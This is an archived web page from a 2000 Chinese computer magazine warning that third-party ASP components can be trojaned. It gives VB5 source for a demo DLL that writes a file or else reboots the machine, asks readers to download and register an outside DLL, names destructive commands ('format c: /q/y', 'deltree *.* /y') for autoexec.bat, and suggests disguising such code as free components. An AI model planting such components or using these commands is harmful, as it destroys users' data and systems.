<HTML>
<HEAD>
<META HTTP-EQUIV='Content-Type' CONTENT='text/html; charset=gb2312'>
<META NAME='author' CONTENT='William Wan'>
<LINK REL='STYLESHEET' HREF='images/cpcw.css' TYPE='text/css'>
<!-- #BeginEditable "doctitle" --> 
<TITLE>电脑报电子版 -- 魔鬼辞典</TITLE>
<!-- #EndEditable --> 
<style type="text/css">
<!--
.centertitle {  font-weight: bold; text-align: center; line-height: 35px; font-size: 9pt; color: #000000}
.lefttitle {  line-height: 35px; font-weight: bold; font-size: 9pt; color: #000000}
-->
</style>
</HEAD>
<BODY BGCOLOR='white'>
<span class="centertitle"></span><A NAME='top'></A> 
<TABLE BORDER='0' WIDTH='468' CELLSPACING='0' CELLPADDING='0' HEIGHT='6' ALIGN='Center' BGCOLOR='#CCCC99'>
<TR VALIGN='top'><TD WIDTH='100%'><IMG SRC='images/dot.gif' WIDTH='468' HEIGHT='1'></TD></TR>
</TABLE><TABLE WIDTH='468' BORDER='0' CELLSPACING='0' CELLPADDING='0' ALIGN='Center'>
<TR>

<TD WIDTH='470' BGCOLOR='#CCCC99' HEIGHT='50'><IMG SRC='images/yjds.gif' WIDTH='468' HEIGHT='60' ALT='广告Logo' BORDER='0'></TD>
</TR>
</TABLE><TABLE BORDER='0' WIDTH='468' CELLSPACING='0' CELLPADDING='0' HEIGHT='2' ALIGN='Center' BGCOLOR='#CCCC99'>
<TR>
<TD WIDTH='100%'><IMG SRC='images/pixel.gif' WIDTH='1' HEIGHT='1'></TD>
</TR>
</TABLE>
<TABLE BORDER='0' WIDTH='468' CELLSPACING='0' CELLPADDING='0' HEIGHT='3' ALIGN='Center' BGCOLOR='#CCCC99'>
<TR VALIGN='bottom'>
<TD WIDTH='100%'><IMG SRC='images/dot.gif' WIDTH='468' HEIGHT='1'></TD>
</TR></TABLE>
<TABLE WIDTH='468' BORDER='0' CELLSPACING='0' CELLPADDING='2' ALIGN='Center'>
<TR>
    <TD WIDTH='615' COLSPAN='2'><font color="#FF6666">当前位置：</font>CPCW电子版 
      &gt; 2000 年 &gt; 12<!-- #BeginEditable "%C6%DA" -->期<!-- #EndEditable --> 
      &gt; <!-- #BeginEditable "%C0%B8%C4%BF" --><a href="internet.html">大众网络</a><!-- #EndEditable --> 
      &gt; ASP组件中的安全问题</TD>
</TR></TABLE>
<TABLE WIDTH='468' BORDER='0' CELLSPACING='0' CELLPADDING='0' ALIGN='center'><TR ALIGN='center' VALIGN='bottom'><TD HEIGHT='6'><IMG SRC='images/dot.gif' WIDTH='468' HEIGHT='1'></TD></TR></TABLE>
<BR><TABLE WIDTH='468' BORDER='0' CELLSPACING='0' CELLPADDING='2' BGCOLOR='#FFCC66' ALIGN='center'>
<TR>
    <TD><SPAN CLASS='title'>《 ASP组件中的安全问题 》</SPAN></TD>
</TR></TABLE><BR><TABLE WIDTH='468' BORDER='0' CELLSPACING='0' CELLPADDING='2' ALIGN='center'>
<TR>
    <TD> 
      <p>　　Microsoft推出的ASP(Active Server Page)以简单、易用、功能多、可扩充性等强大功能得到了网友和大多数网管的喜爱，大有完全代替CGI的趋势。但是我要对你说，如果使用ASP的话，你网络的安全同时也大大降低了！ 
        　　在我继续说下去之前，请你完成以下步骤：<br>
        　　1.下载这个文件“http://home.gbsource.net/xuankong/dll.zip”，解压缩后把其中的test.dll文件拷贝到“c:\windows\system”(如果你是使用NT的话，请拷贝到相应目录)；<br>
        　　2.接下来打开“开始/运行”菜单输入“regsvr32 test.dll”命令；<br>
        　　3.拷贝解压缩后的文件包中的那个index.asp到你的服务器目录（如果你是使用PWS‘Personal Web Server’调试可以拷贝到“c:\Inetpub\wwwroot”，NT请拷贝到相应的目录）；<br>
        　　4.换一台机器用IE浏览index.asp文件看一看（你看到的是出错代码,但是实际上程序已经运行了），你再返回你的机器看一看c:\下是否多了一个文件？！一个名为“xuankong.dat”的文件（其实如果我愿意，你的c:\autoexec.bat文件也可以被我打开并写入一些什么“format 
        c: /q/y”或者“deltree ＊.＊ /y”的命令，等你下次重新启动机器。嘿嘿……）。<br>
        　　我们一起来看看到底是怎么一回事，你刚才拷贝的那些DLL文件其实是我使用Visul Basic 5.0开发的一个组件：<br>
        　　1.打开VB5.0新建一个“ActiveX dll”文件，把下面的代码录入进去。<br>
        　　Private Declare Function ExitWindowsEx Lib ″user32″ _<br>
        　　(ByVal uFlags As Long, ByVal dwReserved As Long) _ <br>
        　　As Long 　　Sub xuankong()′请不要加上″private″ 　<br>
        　a＄ = InputBox(″请输入你的姓名，如果你的输入是″xuankong″″ ＋ Chr(13) ＋ Chr(10) ＋ ″则会在你的系统中生成一个″xuankong.dat″文件″ 
        ＋ Chr(10) ＋ Chr(13) ＋ ″否则的话你的机器可能重启″, ″请输入″, ″xuankong″) <br>
        　　If a＄ = ″xuankong″ Then 　　Open ″c:\xuankong.dat″ For Append As ＃1 　　Write 
        ＃1, ″我的朋友，这是一个ASP组件的测试程序″ 　　Write ＃1, ″hello world！This is a test″ 　　Write 
        ＃1, ″如果你看到这个文件表示测试成功！！！″ 　　Else 　　ExitWindowsEx ＆H43, 0′使用API函数重新启动机器 
        　　End If 　　Close ＃1 　　End Sub <br>
        　　2.把工程名改为dll，类模块改为test，然后把这个工程生成DLL文件到c:\windows\system目录下面。<br>
        　　3.新建一个index.asp文件把下面的代码录入进去。<br>
        　　&lt;％ set rs=server.createobject(″dll.test″)％><br>
        　　&lt;％ set rs1=rs.xuankong 　　 rs1.execute 　　 ％><br>
        　　4.拷贝index.asp到你的服务器内，按照上面所述进行调试！ 　　好了，如果你调试完成，有什么感觉？？？如果是使用VC＋＋ 、Visual 
        Java开发（它们开发出来的组件功能可更加强大）；如果把上面的VB代码改一下，加入到一些FTP组件、E－mail组件、HTTP组件、聊天室组件、计数器组件中……(凡是可以输入/输出的组件，没法输入/输出的组件的破坏力有一定局限），再给这些组件加上一个好听的名字“免费的……”你不上当吗（嘿嘿！说不定你已经上当了，天下免费的东西可是好东西!!!＊^v^＊）?<br>
        　　上面所说的是ASP组件的安全问题！另外如果有些作者在写ASP组件时不小心留下系统bug!那就更加不易被人发觉了！ 　　说明：本文只代表个人观点。本文所提供的代码在Windows 
        98自带的PWS和Visual Basic 5.0下调试通过，如果你在生成ASP组件时出现不能编译的问题，请关闭你的PWS。你有什么想法或意见请E－mail: 
        xuankong@swau.edu.cn。<br>
      </p>
      <p align="right"> （重庆　蒲俊杰） </p>
      </TD>
  </TR></TABLE><TABLE WIDTH='468' BORDER='0' CELLSPACING='0' CELLPADDING='2' ALIGN='center'>
<TR>
<TD><A HREF='http://www.mydown.com/dnb/' TARGET='_blank'>下载本期推荐软件</A></TD><TD ALIGN='right'><A HREF='#top'>页 首</A></TD>
</TR></TABLE><BR>
<TABLE WIDTH='468' BORDER='0' CELLSPACING='0' CELLPADDING='0' ALIGN='center'>
<TR ALIGN='center' VALIGN='bottom'>
<TD HEIGHT='6'><IMG SRC='images/dot.gif' WIDTH='468' HEIGHT='1'></TD>
</TR></TABLE><TABLE WIDTH='468' BORDER='0' CELLSPACING='0' CELLPADDING='2' ALIGN='center'>
<TR ALIGN='center'>
<TD>&nbsp;


</TD>
<TD> CPCW版权所有，<A HREF='mailto:webmaster@cpcw.com'>CPCW网站编辑部</A>设计制作发布</TD>
</TR>
</TABLE></BODY></HTML>